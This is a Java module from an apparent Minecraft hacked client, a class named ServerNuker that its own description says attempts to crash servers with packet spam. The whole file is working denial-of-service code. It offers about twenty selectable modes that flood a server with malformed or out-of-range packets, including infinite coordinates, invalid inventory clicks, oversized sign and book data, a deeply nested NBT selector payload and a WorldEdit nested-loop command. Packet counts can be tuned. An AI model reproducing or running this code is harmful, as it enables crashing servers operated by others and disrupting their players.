package net.payload.module.modules.exploit;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.item.ArmorItem;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.common.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.network.packet.s2c.common.KeepAliveS2CPacket;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.payload.Payload;
import net.payload.PayloadClient;
import net.payload.cmd.CommandManager;
import net.payload.event.events.GameLeftEvent;
import net.payload.event.events.ReceivePacketEvent;
import net.payload.event.events.TickEvent;
import net.payload.event.listeners.GameLeftListener;
import net.payload.event.listeners.ReceivePacketListener;
import net.payload.event.listeners.TickListener;
import net.payload.module.Category;
import net.payload.module.Module;
import net.payload.settings.SettingGroup;
import net.payload.settings.SettingManager;
import net.payload.settings.types.BooleanSetting;
import net.payload.settings.types.EnumSetting;
import net.payload.settings.types.FloatSetting;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.ArrayList;
import java.util.Optional;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class ServerNuker extends Module implements TickListener, ReceivePacketListener, GameLeftListener {

    private final MinecraftClient mc = PayloadClient.MC;
    private final String message = "\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd";
    private final String color = "red";
    private final String line1 = "{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}";
    private final String line2 = "{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}";
    private final String line3 = "{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}";
    private final String line4 = "{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}";

    // Setting Groups for different modes
    private final SettingGroup armorSettings;
    private final SettingGroup windowSettings;
    private final SettingGroup offhandSettings;
    private final SettingGroup vehicleSettings;
    private final SettingGroup bookSettings;
    private final SettingGroup clickSlotSettings;
    private final SettingGroup interactSettings;
    private final SettingGroup movementSettings;
    private final SettingGroup sequenceSettings;
    private final SettingGroup selectorSettings;

    @Override
    public void onReceivePacket(ReceivePacketEvent readPacketEvent) {
        if (mc.player == null || mc.world == null) {
            return;
        }
        if (readPacketEvent.getPacket() instanceof KeepAliveS2CPacket packet) {
            keepAliveId = packet.getId();
        }
    }

    @Override
    public void onGameLeft(GameLeftEvent event) {
        disable();
    }

    public enum Mode {
        ArmorSpam,
        Boat,
        Book,
        Console,
        Chunk,
        CreativeBook,
        InteractItem,
        InteractOOB,
        InvalidClickSlot,
        Lectern,
        MovementSpam,
        NullPosition,
        OffhandSpam,
        Selector,
        OutOfBounds,
        RotationSpam,
        SequenceBlock,
        SequenceItem,
        Sign,
        Vehicle,
        Window,
        WorldEdit,
    }

    // Main mode setting
    private final EnumSetting<Mode> mode = EnumSetting.<Mode>builder()
            .id("crash_mode")
            .displayName("Mode")
            .description("Crash method to use")
            .defaultValue(Mode.Selector)
            .build();

    // General settings (always visible)
    private final BooleanSetting autoDisable = BooleanSetting.builder()
            .id("crash_auto_disable")
            .displayName("Auto Disable")
            .description("Automatically disables the module after sending packets")
            .defaultValue(true)
            .build();

    private final BooleanSetting smartDisable = BooleanSetting.builder()
            .id("crash_smart_disable")
            .displayName("Smart Disable")
            .description("Intelligently disables based on server response")
            .defaultValue(true)
            .build();

    private final FloatSetting delay = FloatSetting.builder()
            .id("crash_delay")
            .displayName("Delay")
            .description("Delay between packet batches in ticks")
            .defaultValue(1f)
            .minValue(0f)
            .maxValue(100f)
            .step(1f)
            .build();

    // Armor mode settings
    private final FloatSetting armorPackets = FloatSetting.builder()
            .id("crash_armor_packets")
            .displayName("Packets")
            .description("Number of armor packets to send")
            .defaultValue(1000f)
            .minValue(1f)
            .maxValue(10000f)
            .step(1f)
            .build();

    // Window mode settings
    private final FloatSetting windowPackets = FloatSetting.builder()
            .id("crash_window_packets")
            .displayName("Packets")
            .description("Number of window packets to send")
            .defaultValue(6f)
            .minValue(2f)
            .maxValue(12f)
            .step(1f)
            .build();

    // Offhand mode settings
    private final FloatSetting offhandPackets = FloatSetting.builder()
            .id("crash_offhand_packets")
            .displayName("Packets")
            .description("Number of offhand packets to send")
            .defaultValue(1000f)
            .minValue(1f)
            .maxValue(10000f)
            .step(1f)
            .build();

    // Vehicle mode settings
    private final FloatSetting vehiclePackets = FloatSetting.builder()
            .id("crash_vehicle_packets")
            .displayName("Packets")
            .description("Number of vehicle packets to send")
            .defaultValue(2000f)
            .minValue(100f)
            .maxValue(10000f)
            .step(1f)
            .build();

    // Book mode settings
    private final FloatSetting bookPackets = FloatSetting.builder()
            .id("crash_book_packets")
            .displayName("Packets")
            .description("Number of book packets to send")
            .defaultValue(100f)
            .minValue(1f)
            .maxValue(1000f)
            .step(1f)
            .build();

    // AAC mode settings
    private final FloatSetting aacPackets = FloatSetting.builder()
            .id("crash_aac_packets")
            .displayName("Packets")
            .description("Number of AAC packets to send")
            .defaultValue(5000f)
            .minValue(1f)
            .maxValue(10000f)
            .step(1f)
            .build();

    // Click slot mode settings
    private final FloatSetting clickSlotPackets = FloatSetting.builder()
            .id("crash_slot_packets")
            .displayName("Packets")
            .description("Number of click slot packets to send")
            .defaultValue(15f)
            .minValue(1f)
            .maxValue(100f)
            .step(1f)
            .build();

    // Interact mode settings
    private final FloatSetting interactPackets = FloatSetting.builder()
            .id("crash_interact_packets")
            .displayName("Packets")
            .description("Number of interaction packets to send")
            .defaultValue(15f)
            .minValue(1f)
            .maxValue(100f)
            .step(1f)
            .build();

    // Movement mode settings
    private final FloatSetting movementPackets = FloatSetting.builder()
            .id("crash_movement_packets")
            .displayName("Packets")
            .description("Number of movement packets to send")
            .defaultValue(2000f)
            .minValue(1f)
            .maxValue(10000f)
            .step(1f)
            .build();

    // Sequence mode settings
    private final FloatSetting sequencePackets = FloatSetting.builder()
            .id("crash_sequence_packets")
            .displayName("Packets")
            .description("Number of sequence packets to send")
            .defaultValue(200f)
            .minValue(50f)
            .maxValue(2000f)
            .step(1f)
            .build();

    // Selector mode settings
    private final FloatSetting commandPackets = FloatSetting.builder()
            .id("crash_command_count")
            .displayName("Count")
            .description("Number of command packets to send")
            .defaultValue(3f)
            .minValue(1f)
            .maxValue(5f)
            .step(1f)
            .build();

    private final FloatSetting length = FloatSetting.builder()
            .id("crash_length")
            .displayName("Length")
            .description("Length of command data")
            .defaultValue(2032f)
            .minValue(1000f)
            .maxValue(3000f)
            .step(1f)
            .build();

    public ServerNuker() {
        super("ServerNuker");
        this.setCategory(Category.of("Exploit"));
        this.setDescription("Attempts to crash the server with packet spam");

        armorSettings = SettingGroup.Builder.builder()
                .id("crash_armor_mode")
                .displayName("Armor")
                .description("Settings for Armor crash")
                .build();

        windowSettings = SettingGroup.Builder.builder()
                .id("crash_window_mode")
                .displayName("Window")
                .description("Settings for Window crash")
                .build();

        offhandSettings = SettingGroup.Builder.builder()
                .id("crash_offhand_mode")
                .displayName("Offhand")
                .description("Settings for Offhand crash")
                .build();

        vehicleSettings = SettingGroup.Builder.builder()
                .id("crash_vehicle_mode")
                .displayName("Vehicle")
                .description("Settings for Vehicle crash")
                .build();

        bookSettings = SettingGroup.Builder.builder()
                .id("crash_book_mode")
                .displayName("Book")
                .description("Settings for Book crash")
                .build();

        clickSlotSettings = SettingGroup.Builder.builder()
                .id("crash_clickslot_mode")
                .displayName("Click Slot")
                .description("Settings for Click Slot crash")
                .build();

        interactSettings = SettingGroup.Builder.builder()
                .id("crash_interact_mode")
                .displayName("Interact")
                .description("Settings for Interact crash")
                .build();

        movementSettings = SettingGroup.Builder.builder()
                .id("crash_movement_mode")
                .displayName("Movement")
                .description("Settings for Movement crash")
                .build();

        sequenceSettings = SettingGroup.Builder.builder()
                .id("crash_sequence_mode")
                .displayName("Sequence")
                .description("Settings for Sequence crash")
                .build();

        selectorSettings = SettingGroup.Builder.builder()
                .id("crash_selector_mode")
                .displayName("Selector")
                .description("Settings for Selector crash")
                .build();

        // Add settings to general group
        this.addSetting(mode);
        this.addSetting(autoDisable);
        this.addSetting(smartDisable);
        this.addSetting(delay);

        // Add settings to specific mode groups
        armorSettings.addSetting(armorPackets);
        windowSettings.addSetting(windowPackets);
        offhandSettings.addSetting(offhandPackets);
        vehicleSettings.addSetting(vehiclePackets);
        bookSettings.addSetting(bookPackets);
        clickSlotSettings.addSetting(clickSlotPackets);
        interactSettings.addSetting(interactPackets);
        movementSettings.addSetting(movementPackets);
        sequenceSettings.addSetting(sequencePackets);
        selectorSettings.addSetting(commandPackets);
        selectorSettings.addSetting(length);

        // Add groups to module
        this.addSetting(armorSettings);
        this.addSetting(windowSettings);
        this.addSetting(offhandSettings);
        this.addSetting(vehicleSettings);
        this.addSetting(bookSettings);
        this.addSetting(clickSlotSettings);
        this.addSetting(interactSettings);
        this.addSetting(movementSettings);
        this.addSetting(sequenceSettings);
        this.addSetting(selectorSettings);

        // Register all settings with SettingManager
        registerAllSettings();
    }

    private void registerAllSettings() {
        // Register general settings
        SettingManager.registerSetting(mode);
        SettingManager.registerSetting(autoDisable);
        SettingManager.registerSetting(smartDisable);
        SettingManager.registerSetting(delay);

        // Register armor settings
        SettingManager.registerSetting(armorSettings);
        SettingManager.registerSetting(armorPackets);

        // Register window settings
        SettingManager.registerSetting(windowSettings);
        SettingManager.registerSetting(windowPackets);

        // Register offhand settings
        SettingManager.registerSetting(offhandSettings);
        SettingManager.registerSetting(offhandPackets);

        // Register vehicle settings
        SettingManager.registerSetting(vehicleSettings);
        SettingManager.registerSetting(vehiclePackets);

        // Register book settings
        SettingManager.registerSetting(bookSettings);
        SettingManager.registerSetting(bookPackets);

        SettingManager.registerSetting(aacPackets);

        // Register click slot settings
        SettingManager.registerSetting(clickSlotSettings);
        SettingManager.registerSetting(clickSlotPackets);

        // Register interact settings
        SettingManager.registerSetting(interactSettings);
        SettingManager.registerSetting(interactPackets);

        // Register movement settings
        SettingManager.registerSetting(movementSettings);
        SettingManager.registerSetting(movementPackets);

        // Register sequence settings
        SettingManager.registerSetting(sequenceSettings);
        SettingManager.registerSetting(sequencePackets);

        // Register selector settings
        SettingManager.registerSetting(selectorSettings);
        SettingManager.registerSetting(commandPackets);
        SettingManager.registerSetting(length);
    }

    private long keepAliveId;
    int ticks = 0;

    @Override
    public void onTick(TickEvent.Pre event) {

    }

    @Override
    public void onTick(TickEvent.Post event) {
        if (nullCheck()) {
            if (autoDisable.getValue()) disable();
            return;
        }
        ticks++;
        if (ticks <= delay.getValue()) {
            return;
        }
        ticks = 0;
        switch (mode.getValue()) {
            case Window -> {
                ScreenHandler handler = mc.player.currentScreenHandler;
                Int2ObjectArrayMap itemMap = new Int2ObjectArrayMap();
                itemMap.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
                for (int i = 0; i < windowPackets.getValue() + 1; i++) {
                    mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(handler.syncId, handler.getRevision(), 36, -1, SlotActionType.SWAP, handler.getCursorStack().copy(), itemMap));
                }
            }
            case ArmorSpam -> {
                for (int i = 0; i < armorPackets.getValue().intValue(); i++) {
                    if (mc.player.getInventory().getStack(38).getItem() != Items.AIR) {
                        mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId,
                                6, 0, SlotActionType.SWAP, mc.player);
                    }
                    if (mc.player.getMainHandStack().getItem() instanceof ArmorItem) {
                        mc.interactionManager.interactItem(mc.player, Hand.MAIN_HAND);
                    }
                }
            }
            case Console -> {
                for (int i = 0; i < 5; i++) {
                    KeepAliveC2SPacket packet = new KeepAliveC2SPacket(keepAliveId++);
                    try {
                        mc.getNetworkHandler().sendPacket(packet);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            case OutOfBounds -> {
                for (int i = 0; i < 100; i++) {
                    ItemStack stack = new ItemStack(mc.player.getMainHandStack().getItem());
                    ClickSlotC2SPacket packet = new ClickSlotC2SPacket(0, 69,
                            mc.player.currentScreenHandler.getRevision(), 1,
                            SlotActionType.QUICK_MOVE, stack, new Int2ObjectOpenHashMap<>());
                    try {
                        mc.getNetworkHandler().sendPacket(packet);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            case SequenceItem -> {
                for (int i = 0; i < sequencePackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, -1, MC.player.getYaw(), MC.player.getPitch()));
                }
            }
            case SequenceBlock -> {
                Vec3d pos = new Vec3d(mc.player.getX(), mc.player.getY(), mc.player.getZ());
                BlockHitResult bhr = new BlockHitResult(pos, Direction.DOWN, BlockPos.ofFloored(pos), false);
                for (int i = 0; i < sequencePackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, -1));
                }
            }
            case MovementSpam -> {
                if (mc.getNetworkHandler() == null) return;
                try {
                    Vec3d current_pos = mc.player.getPos();
                    for (int i = 0; i < movementPackets.getValue(); i++) {
                        PlayerMoveC2SPacket.Full move_packet = new PlayerMoveC2SPacket.Full(current_pos.x + getDistributedRandom(1),
                                current_pos.y + getDistributedRandom(1), current_pos.z + getDistributedRandom(1),
                                (float) rndD(90), (float) rndD(180), true, MC.player.horizontalCollision);
                        mc.getNetworkHandler().sendPacket(move_packet);
                    }
                } catch (Exception e) {
                    CommandManager.sendChatMessage("§4[!] " + e.getMessage());
                    e.printStackTrace();
                    if (smartDisable.getValue()) disable();
                }
            }
            case RotationSpam -> {
                mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(0, 0, true, MC.player.horizontalCollision));
                mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(180, 0, true, MC.player.horizontalCollision));
                mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(0, 0, true, MC.player.horizontalCollision));
                mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(180, 0, true, MC.player.horizontalCollision));
            }
            case Sign -> mc.getNetworkHandler().sendPacket(new UpdateSignC2SPacket(mc.player.getBlockPos(), false, line1, line2, line3, line4));
            case Selector -> {
                String overflow = generateJsonObject(length.getValue().intValue());

                String partialCommand = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);
                for (int i = 0; i < commandPackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
                }
                if (smartDisable.getValue()) disable();
            }
            case Lectern -> {
                if (!(mc.currentScreen instanceof LecternScreen)) return;
                mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId, mc.player.currentScreenHandler.getRevision(), 0, 0, SlotActionType.QUICK_MOVE, mc.player.currentScreenHandler.getCursorStack().copy(), Int2ObjectMaps.emptyMap()));
                if (smartDisable.getValue()) disable();
            }
            case InteractOOB -> {
                Vec3d oob = new Vec3d(Double.POSITIVE_INFINITY, 255, Double.NEGATIVE_INFINITY);
                mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(oob, Direction.DOWN, BlockPos.ofFloored(oob), false), 0));
            }
            case InteractItem -> {
                for (int i = 0; i < interactPackets.getValue(); i++) {
                    sendSequencedPacket(id -> new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, id, MC.player.getYaw(), MC.player.getPitch()));
                }
            }
            case InvalidClickSlot -> {
                Int2ObjectMap<ItemStack> REAL = new Int2ObjectArrayMap<>();
                REAL.put(0, new ItemStack(Items.RED_DYE, 1));
                for (int i = 0; i < clickSlotPackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId,123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack(Items.AIR, -1), REAL));
                }
            }
            case NullPosition -> {
                for (double i = 0; i < aacPackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true, MC.player.horizontalCollision));
                }
                if (smartDisable.getValue()) disable();
            }
            case Book, CreativeBook -> {
                for (int i = 0; i < bookPackets.getValue(); i++) sendBadBook();
                if (smartDisable.getValue()) disable();
            }
            case Boat -> {
                Entity vehicle = mc.player.getVehicle();
                if (vehicle == null) {
                    if (smartDisable.getValue()) disable();
                    return;
                }
                if (!(vehicle instanceof BoatEntity)) {
                    if (smartDisable.getValue()) disable();
                }
                for (int i = 0; i < vehiclePackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new BoatPaddleStateC2SPacket(true, true));
                }
            }
            case Vehicle -> {
                Entity vehicle = mc.player.getVehicle();
                if (vehicle == null) {
                    if (smartDisable.getValue()) disable();
                    return;
                }
                BlockPos start = mc.player.getBlockPos();
                Vec3d end = new Vec3d(start.getX() + .5, start.getY() + 1, start.getZ() + .5);
                vehicle.updatePosition(end.x, end.y - 1, end.z);
                for (int i = 0; i < vehiclePackets.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new VehicleMoveC2SPacket(vehicle.getPos(), vehicle.getYaw(), vehicle.getPitch(), vehicle.groundCollision));
                }
            }
            case OffhandSpam -> {
                int index = 0;
                while (index < offhandPackets.getValue()) {
                    mc.getNetworkHandler().sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.UP));
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(true, MC.player.horizontalCollision));
                    ++index;
                }
            }
            case WorldEdit -> {
                mc.getNetworkHandler().sendChatCommand("/calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}");
                if (smartDisable.getValue()) disable();
            }
            case Chunk -> {
                double yPos = mc.player.getY();
                while (yPos < 255) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), yPos, mc.player.getZ(), true, MC.player.horizontalCollision));
                    yPos += 5.0;
                }
                double i = 0;
                while (i < 1337 * 5) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + i, 255.0, mc.player.getZ() + i, true, MC.player.horizontalCollision));
                    i += 5;
                }
            }
        }
    }

    @Override
    public void onDisable() {
        ticks = 999;
        Payload.getInstance().eventManager.RemoveListener(TickListener.class, this);
        Payload.getInstance().eventManager.RemoveListener(ReceivePacketListener.class, this);
        Payload.getInstance().eventManager.RemoveListener(GameLeftListener.class, this);
    }

    @Override
    public void onEnable() {
        Payload.getInstance().eventManager.AddListener(TickListener.class, this);
        Payload.getInstance().eventManager.AddListener(ReceivePacketListener.class, this);
        Payload.getInstance().eventManager.AddListener(GameLeftListener.class, this);
    }

    @Override
    public void onToggle() {

    }

    public void disable() {
        if (this.state.getValue()) {
            this.toggle();
        }
    }

    private void sendBadBook() {
        String title = "/stop" + Math.random() * 400;
        String mm255 = RandomStringUtils.randomAlphanumeric(255);

        switch (mode.getValue()) {
            case Book -> {
                ArrayList<String> pages = new ArrayList<>();

                for (int i = 0; i < 50; i++) {
                    pages.add(mm255);
                }

                mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
            }
        }
    }

    public double getDistributedRandom(double rad) {
        return (rndD(rad) - (rad / 2));
    }
    public static double rndD(double rad) {
        Random r = new Random();
        return r.nextDouble() * rad;
    }
    private String generateJsonObject(int levels) {
        String json = IntStream.range(0, levels)
                .mapToObj(i -> "[")
                .collect(Collectors.joining());
        return "{a:" + json + "}";
    }
}
